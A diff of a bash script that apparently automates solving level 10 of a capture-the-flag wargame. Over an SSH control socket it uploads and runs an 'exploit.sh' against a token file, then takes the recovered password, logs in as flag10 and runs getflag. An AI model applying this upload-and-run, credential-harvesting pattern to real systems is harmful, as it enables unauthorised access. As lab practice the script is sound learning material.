@@ -113,17 +113,18 @@ main() {
     flag10_password="";
 
     init_ssh_socket "$level10_socket_path" "$host" "$port" "$level10_username" "$level10_password";
-    ssh_exec_via_socket "$level10_socket_path" "$host" "$port" "$level10_username" "echo 'Hello world !'";
+    scp -o "ControlPath=$level10_socket_path" "$CURR_DIR_PATH/exploit.sh" "$level10_username@$host:/tmp/exploit.sh";
+    flag10_password=$(ssh_exec_via_socket "$level10_socket_path" "$host" "$port" "$level10_username" "/tmp/exploit.sh /tmp/token");
     close_ssh_socket "$level10_socket_path" "$host" "$port" "$level10_username";
 
-    # init_ssh_socket "$flag10_socket_path" "$host" "$port" "$flag10_username" "$flag10_password";
-    # checkflag_str=$(ssh_exec_via_socket "$flag10_socket_path" "$host" "$port" "$flag10_username" "getflag");
-    # checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
-    # close_ssh_socket "$flag10_socket_path" "$host" "$port" "$flag10_username";
+    init_ssh_socket "$flag10_socket_path" "$host" "$port" "$flag10_username" "$flag10_password";
+    checkflag_str=$(ssh_exec_via_socket "$flag10_socket_path" "$host" "$port" "$flag10_username" "getflag");
+    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
+    close_ssh_socket "$flag10_socket_path" "$host" "$port" "$flag10_username";
 
-    # flag_outpath="$CURR_DIR_PATH/../flag";
-    # echo "Checkflag: $checkflag";
-    # echo -n "$checkflag" > "$flag_outpath";
+    flag_outpath="$CURR_DIR_PATH/../flag";
+    echo "Checkflag: $checkflag";
+    echo -n "$checkflag" > "$flag_outpath";
 }
 
 main "$@";
